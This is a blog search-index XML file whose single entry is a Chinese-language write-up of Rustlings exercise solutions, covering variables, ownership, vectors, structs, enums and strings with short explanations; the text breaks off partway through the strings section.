<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Rustlings</title>
    <link href="/2024/04/19/Rustlings/"/>
    <url>/2024/04/19/Rustlings/</url>
    
    <content type="html"><![CDATA[<h2 id="Rustlings">Rustlings</h2><h3 id="intro">intro</h3><p>略过 不想写</p><h3 id="Variables">Variables</h3><h4 id="1">1</h4><p>加个 let 就彳亍…</p><h4 id="2">2</h4><p>…</p><h4 id="3">3</h4><p>…</p><h4 id="4">4</h4><p>声明一个 mut 即可.</p><h4 id="5">5</h4><p>Shadowing , 申请一个同名的变量.</p><h4 id="6">6</h4><p>Constants types must also always be annotated, 常量声明时必须标注类型.</p><h3 id="Functions">Functions</h3><h4 id="1-v2">1</h4><p>smjbdx…</p><h4 id="2-v2">2</h4><p>函数参数必须标注类型.</p><h4 id="3-v2">3</h4><p>… 没参数, 随便给一个就行…</p><h4 id="4-v2">4</h4><p><code>sale_price</code> 函数没有给返回值类型, 填上即可.</p><h4 id="5-v2">5</h4><p>返回的语句多了一个分号, 有这个分号的话返回值类型会变成 <code>()</code> , 去掉这个分号的话就是一个表达式了.</p><h3 id="IF">IF</h3><h4 id="1-v3">1</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">bigger</span>(a: <span class="hljs-type">i32</span>, b: <span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-keyword">if</span> a &gt;= b &#123;<br>        a<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        b<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-v3">2</h4><p>同理随便改改…</p><h4 id="3-v3">3</h4><p>随便改改…</p><h3 id="quiz1">quiz1</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">calculate_price_of_apples</span>(num:<span class="hljs-type">i32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> &#123;<br>    <span class="hljs-keyword">if</span> num &lt;= <span class="hljs-number">40</span> &#123;<br>        num * <span class="hljs-number">2</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        num<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="primitive-types">primitive_types</h3><h4 id="1-bools">1 bools</h4><p>写个变量 = true 即可.</p><h4 id="2-char">2 char</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">your_character</span> = &#x27;👴&#x27;;<br></code></pre></td></tr></table></figure><p>👴, rust 中的 char 可以是任何一个字符, 记得没错的话是 unicode .</p><h4 id="3-array">3 array</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">a</span> = [<span class="hljs-string">&quot;otto&quot;</span>;<span class="hljs-number">100</span>];<br></code></pre></td></tr></table></figure><p>数组的声明方法, 和 c 的不怎么一样, 声明一个元素和元素个数.</p><h4 id="4-slice">4 slice</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">nice_slice</span> = &amp;a[<span class="hljs-number">1</span>..<span class="hljs-number">4</span>];<br></code></pre></td></tr></table></figure><p>如果要把索引 4 也加上就要 <code>[1..=4]</code> .</p><h4 id="5-tuple">5 tuple</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">cat</span> = (<span class="hljs-string">&quot;Furry McFurson&quot;</span>, <span class="hljs-number">3.5</span>);<br><span class="hljs-keyword">let</span> (name,age) = cat;<br></code></pre></td></tr></table></figure><p>let 可以对变量进行解构, 于是就可以对一个元组这么写.</p><h4 id="6-tuple-index">6 tuple index</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">second</span> = numbers.<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>元组索引可以直接这么写啊, 彳亍.</p><h3 id="vec">vec</h3><h4 id="1-v4">1</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>];<br></code></pre></td></tr></table></figure><p>如果不这么写就要:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">v</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();<br>pushpushpushpush...<br></code></pre></td></tr></table></figure><p>第一种写法用的是 <code>vec![]</code> 这个宏, 这个宏可以方便的创建一个带有初始元素的 vec .</p><h4 id="2-v4">2</h4><p>感觉这个有点意思（</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> v: Vec&lt;i32&gt; = (<span class="hljs-number">1</span>..).filter(|x| x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>).take(<span class="hljs-number">5</span>).collect();<br></code></pre></td></tr></table></figure><p>这行代码创建了一个 <code>Vec&lt;i32&gt;</code> 类型的变量 <code>v</code>。它使用了 Rust 的迭代器（iterator）功能。具体来说：</p><ul><li><code>(1..)</code> 创建了一个无限的整数范围，从1开始。</li><li><code>.filter(|x| x % 2 == 0)</code> 过滤器用于保留能被2整除的整数，即偶数。</li><li><code>.take(5)</code> 用于仅获取前5个满足条件的整数。</li><li><code>.collect()</code> 将这些整数收集到一个 <code>Vec&lt;i32&gt;</code> 向量中。</li></ul><p>主体逻辑就是造了个只有偶数的向量传进要写的函数里面, 提供两种对这个向量进行操作的方法:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-number">1</span>.<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">vec_loop</span>(<span class="hljs-keyword">mut</span> v: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; &#123;<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">element</span> <span class="hljs-keyword">in</span> v.<span class="hljs-title function_ invoke__">iter_mut</span>() &#123;<br>        *element *= <span class="hljs-number">2</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// At this point, `v` should be equal to [4, 8, 12, 16, 20].</span><br>    v<br>&#125;<br></code></pre></td></tr></table></figure><p><code>v.iter_mut()</code> 是针对 <code>Vec</code>（向量）类型的一个方法调用，用于<strong>创建一个可变引用的迭代器</strong>，该迭代器允许以可变的方式遍历向量中的元素。与 <code>v.iter()</code> 方法不同，<code>v.iter_mut()</code> 返回的迭代器允许修改向量中的元素。</p><p>后续修改的时候只需要对这些可变引用解引用 + 操作即可, 这是第一种.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-number">2</span>.<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">vec_map</span>(v: &amp;<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; &#123;<br>    v.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">map</span>(|element| &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Do the same thing as above - but instead of mutating the</span><br>        <span class="hljs-comment">// Vec, you can just return the new number!</span><br>        element * <span class="hljs-number">2</span><br>    &#125;).<span class="hljs-title function_ invoke__">collect</span>()<br>&#125;<br></code></pre></td></tr></table></figure><p><code>v_iter</code> 相对的就是<strong>创建一个不可变引用的迭代器</strong>, 后面的闭包捕获了迭代器中的元素作为它的参数 (大概是这样) , 然后对每个元素进行 *2 操作, 最后使用 <code>.collect()</code> 方法放进一个新的向量中, 再返回.</p><h3 id="Move-semantics">Move_semantics</h3><h4 id="1-v5">1</h4><p>改个 mut .</p><h4 id="2-v5">2</h4><p>感觉这个也彳亍.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">vec0</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">22</span>, <span class="hljs-number">44</span>, <span class="hljs-number">66</span>];<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">vec1</span> = <span class="hljs-title function_ invoke__">fill_vec</span>(&amp;vec0);<br><br>    <span class="hljs-built_in">assert_eq!</span>(vec0, <span class="hljs-built_in">vec!</span>[<span class="hljs-number">22</span>, <span class="hljs-number">44</span>, <span class="hljs-number">66</span>]);<br>    <span class="hljs-built_in">assert_eq!</span>(vec1, <span class="hljs-built_in">vec!</span>[<span class="hljs-number">22</span>, <span class="hljs-number">44</span>, <span class="hljs-number">66</span>, <span class="hljs-number">88</span>]);<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">fill_vec</span>(vec: &amp;<span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt;) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">vec</span> = vec.<span class="hljs-title function_ invoke__">clone</span>();<br><br>    vec.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">88</span>);<br><br>    vec<br>&#125;<br></code></pre></td></tr></table></figure><p>这里涉及到所有权的概念, 原本将 vec0 当做参数传进函数中, 但是这时候堆上数据的所有权已经给到了函数的参数而非之前的 vec0 , 以至于 vec0 不能在后面的 assert 中使用.</p><p>解决方法可以是再创建一个 vec 传进函数, 也可以像上面这样传一个引用进去, 使用 clone 方法拿到值再返回去, 这样不存在所有权的改变.</p><h4 id="3-v4">3</h4><p>和第一个的区别就是参数, 其实这里在参数前面加个 mut 就可以.</p><h4 id="4-v3">4</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">vec1</span> = <span class="hljs-title function_ invoke__">fill_vec</span>();<br><br>    <span class="hljs-built_in">assert_eq!</span>(vec1, <span class="hljs-built_in">vec!</span>[<span class="hljs-number">22</span>, <span class="hljs-number">44</span>, <span class="hljs-number">66</span>, <span class="hljs-number">88</span>]);<br>&#125;<br><br><span class="hljs-comment">// `fill_vec()` no longer takes `vec: Vec&lt;i32&gt;` as argument - don&#x27;t change this!</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">fill_vec</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; &#123;<br>    <span class="hljs-comment">// Instead, let&#x27;s create and fill the Vec in here - how do you do that?</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">vec</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">22</span>,<span class="hljs-number">44</span>,<span class="hljs-number">66</span>];<br><br>    vec.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">88</span>);<br><br>    vec<br>&#125;<br></code></pre></td></tr></table></figure><p>感觉这个东西有点多余, 但是似乎思想是 “这里可以不需要之前那种所有权的移动”.</p><h4 id="5-v3">5</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">x</span> = <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = &amp;<span class="hljs-keyword">mut</span> x;<br>    *y += <span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">z</span> = &amp;<span class="hljs-keyword">mut</span> x;<br>    *z += <span class="hljs-number">1000</span>;<br>    <span class="hljs-built_in">assert_eq!</span>(x, <span class="hljs-number">1200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>同一作用域中, 一个变量的可变引用只能有一个, 并且这个引用在最后一次使用后被销毁.</strong></p><p>所以把声明 z 的位置放在 y 最后一次使用之后即可.</p><h4 id="6-v2">6</h4><p>先记录一下函数:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_char</span>(&amp;data: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">char</span> &#123;<br>    data.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">last</span>().<span class="hljs-title function_ invoke__">unwrap</span>()<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p><code>data.chars()</code></p><p>这部分调用了 <code>String</code> 类型的 <code>chars()</code> 方法，该方法返回一个迭代器，用于遍历字符串 <code>data</code> 中的每个字符。</p></li><li><p><code>.last()</code></p><p><code>last()</code> 方法用于获取迭代器中的最后一个元素，即最后一个字符。由于 <code>chars()</code> 返回的是一个字符迭代器，因此 <code>.last()</code> 方法返回的是一个 <code>Option&lt;char&gt;</code> 类型的值，表示可能有字符或可能为空。</p></li><li><p><code>.unwrap()</code></p><p><code>unwrap()</code> 方法用于从 <code>Option</code> 类型的值中获取其内部的值。在这里，因为我们知道字符串不会为空（否则会出现 panic），所以可以安全地调用 <code>unwrap()</code> 方法来获取 <code>Option&lt;char&gt;</code> 类型的字符值。</p></li><li><p><code>to_uppercase()</code></p><p>变大写.</p></li></ol><p>本体没那么难, 加加减减几个 <code>&amp;</code> 的事.</p><h3 id="Struct">Struct</h3><h4 id="1-v6">1</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ColorClassicStruct</span> &#123;<br>    red :<span class="hljs-type">u8</span>,<br>    green :<span class="hljs-type">u8</span>,<br>    blue :<span class="hljs-type">u8</span>,<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ColorTupleStruct</span>(<span class="hljs-type">u8</span>,<span class="hljs-type">u8</span>,<span class="hljs-type">u8</span>);<br><br><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">UnitLikeStruct</span>;<br><br><span class="hljs-meta">#[cfg(test)]</span><br><span class="hljs-keyword">mod</span> tests &#123;<br>    <span class="hljs-keyword">use</span> super::*;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">classic_c_structs</span>() &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Instantiate a classic c struct!</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">green</span> = ColorClassicStruct &#123;<br>            red: <span class="hljs-number">0</span>,<br>            green: <span class="hljs-number">255</span>,<br>            blue: <span class="hljs-number">0</span>,<br>        &#125;;<br><br>        <span class="hljs-built_in">assert_eq!</span>(green.red, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">assert_eq!</span>(green.green, <span class="hljs-number">255</span>);<br>        <span class="hljs-built_in">assert_eq!</span>(green.blue, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">tuple_structs</span>() &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Instantiate a tuple struct!</span><br>         <span class="hljs-keyword">let</span> <span class="hljs-variable">green</span> = <span class="hljs-title function_ invoke__">ColorTupleStruct</span>(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">assert_eq!</span>(green.<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">assert_eq!</span>(green.<span class="hljs-number">1</span>, <span class="hljs-number">255</span>);<br>        <span class="hljs-built_in">assert_eq!</span>(green.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-meta">#[test]</span><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">unit_structs</span>() &#123;<br>        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Instantiate a unit-like struct!</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">unit_like_struct</span> = UnitLikeStruct;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">message</span> = <span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;&#123;:?&#125;s are fun!&quot;</span>, unit_like_struct);<br><br>        <span class="hljs-built_in">assert_eq!</span>(message, <span class="hljs-string">&quot;UnitLikeStructs are fun!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一些基础的结构体的定义方法.</p><h4 id="2-v6">2</h4><p>照着 assert 写就彳亍, 其中 <code>String::from()</code> 是对切片/ <code>&amp;str</code> 类型的转换.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">your_order</span> = Order &#123;<br>            name: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;Hacker in Rust&quot;</span>),<br>            year: <span class="hljs-number">2019</span>,<br>            made_by_phone: <span class="hljs-literal">false</span>,<br>            made_by_mobile: <span class="hljs-literal">false</span>,<br>            made_by_email: <span class="hljs-literal">true</span>,<br>            item_number: <span class="hljs-number">123</span>,<br>            count: <span class="hljs-number">1</span>,<br>        &#125;;<br></code></pre></td></tr></table></figure><h4 id="3-v5">3</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">is_international</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">bool</span> &#123;<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">self</span>.sender_country == <span class="hljs-keyword">self</span>.recipient_country &#123;<br>            <span class="hljs-literal">false</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-literal">true</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_fees</span>(&amp;<span class="hljs-keyword">self</span>, cents_per_gram: <span class="hljs-type">u32</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u32</span> &#123;<br>        cents_per_gram * <span class="hljs-keyword">self</span>.weight_in_grams<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在 Rust 中，<code>self</code> 是一个特殊的关键字，用于表示结构体或者枚举类型的实例。在结构体或者枚举的方法中，<code>self</code> 用来引用当前实例。方法定义中的 <code>&amp;self</code> 表示一个不可变的引用，而 <code>&amp;mut self</code> 则表示一个可变的引用。这种引用的机制允许在方法中访问当前实例的字段或者调用其他方法。</p><p>结构体 + 方法的使用.</p><h3 id="Enums">Enums</h3><h4 id="1-v7">1</h4><p>把几个变体写上去就行.</p><h4 id="2-v7">2</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Message</span> &#123;<br>    Move &#123;x:<span class="hljs-type">u32</span>,y:<span class="hljs-type">u32</span>&#125;,<br>    <span class="hljs-title function_ invoke__">Echo</span>(<span class="hljs-type">String</span>),<br>    <span class="hljs-title function_ invoke__">ChangeColor</span>(<span class="hljs-type">i32</span>,<span class="hljs-type">i32</span>,<span class="hljs-type">i32</span>),<br>    Quit,<br>&#125;<br></code></pre></td></tr></table></figure><p>写上变体规定点类型就行.</p><h4 id="3-v6">3</h4><p>可能用的没那么明白, 但是道理就是写一个 match 去匹配 enums 即可.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, message: Message) &#123;<br>        <span class="hljs-keyword">match</span> message &#123;<br>            Message::<span class="hljs-title function_ invoke__">ChangeColor</span>(c) =&gt; <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">change_color</span>(c),<br>            Message::<span class="hljs-title function_ invoke__">Echo</span>(c) =&gt; <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">echo</span>(c),<br>            Message::<span class="hljs-title function_ invoke__">Move</span>(c) =&gt; <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">move_position</span>(c),<br>            Message::Quit =&gt; <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">quit</span>(),<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>#[cfg(test)]</code> 是 Rust 中的条件编译属性（Conditional Compilation Attribute）。它告诉 Rust 编译器在特定条件下是否编译代码块。</p><p>在这个例子中，<code>#[cfg(test)]</code> 用于标记测试代码。通常情况下，测试代码不会在发布版本中使用，而是在开发过程中用于测试和调试。因此，通过 <code>#[cfg(test)]</code>，可以告诉编译器只在运行测试时编译这部分代码，而在发布时忽略它们。</p><h3 id="Strings">Strings</h3><h4 id="1-v8">1</h4><p>函数返回值是个字面量, 但是返回值是 <code>String</code>.</p><h4 id="2-v8">2</h4><p>传个引用就行.</p><h4 id="3-v7">3</h4><p>字符串有关操作:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">trim_me</span>(input: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Remove whitespace from both ends of a string!</span><br>    <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(input.<span class="hljs-title function_ invoke__">trim</span>())<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">compose_me</span>(input: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Add &quot; world!&quot; to the string! There&#x27;s multiple ways to do this!</span><br>    input.<span class="hljs-title function_ invoke__">to_string</span>() + <span class="hljs-string">&quot; world!&quot;</span><br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">replace_me</span>(input: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">String</span> &#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Replace &quot;cars&quot; in the string with &quot;balloons&quot;!</span><br>    input.<span class="hljs-title function_ invoke__">to_string</span>().<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;cars&quot;</span>,<span class="hljs-string">&quot;balloons&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>去除空格的 trim , 转换和字符串连接, 替换 replace .</p><h4 id="4-v4">4</h4><p>区分 <code>&amp;str</code> 和 <code>String</code> 型.</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">string_slice</span>(arg: &amp;<span class="hljs-type">str</span>) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, arg);<br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">string</span>(arg: <span class="hljs-type">String</span>) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, arg);<br>&#125;<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-title function_ invoke__">string_slice</span>(<span class="hljs-string">&quot;blue&quot;</span>);<br>    <span class="hljs-title function_ invoke__">string</span>(<span class="hljs-string">&quot;red&quot;</span>.<span class="hljs-title function_ invoke__">to_string</span>());<br>    <span class="hljs-title function_ invoke__">string</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;hi&quot;</span>));<br>    <span class="hljs-title 